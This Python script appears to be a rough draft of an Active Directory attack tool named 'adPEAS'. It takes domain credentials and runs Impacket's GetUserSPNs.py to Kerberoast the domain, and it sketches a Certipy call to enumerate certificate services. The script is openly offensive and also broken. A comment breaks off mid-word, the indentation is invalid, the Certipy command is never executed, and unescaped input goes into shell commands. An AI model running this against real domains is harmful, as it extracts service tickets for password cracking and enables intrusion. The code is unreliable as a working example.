import subprocess
from ldap3 import Server, Connection, SUBTREE

def find_and_kerberoast_objects(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controlle
            cmd = f"GetUserSPNs.py -dc-ip {dc_ip} {domain}/{username}:{password} -request"
            subprocess.run(cmd, shell=True)
    except Exception as e:
        print(f"Error while searching for kerberoastable objects or Kerberoasting: {e}")

def certipy(username, password, domain, dc_ip):
     try:
          cmd = f"certipy-ad find {username}@{domain}:{password} -dc-ip {dc_ip}"
     except:
          print(f"Error while running Certipy")

# Example usage:
username = input("Enter username: ")
# usernameWithDomain = input("Enter your username in this format: DOMAIN/username")
password = input("Enter password: ")
domain = input("Enter domain: ")
dc_ip = input("Enter domain controller IP or hostname: ")

print("Welcome to adPEAS v1.0!")
print("Attempting to kerberoast the domain...")
find_and_kerberoast_objects(username, password, domain, dc_ip)
print("Kerberoasting done!")
print("Attempting to find all ADCS infrastructure...")
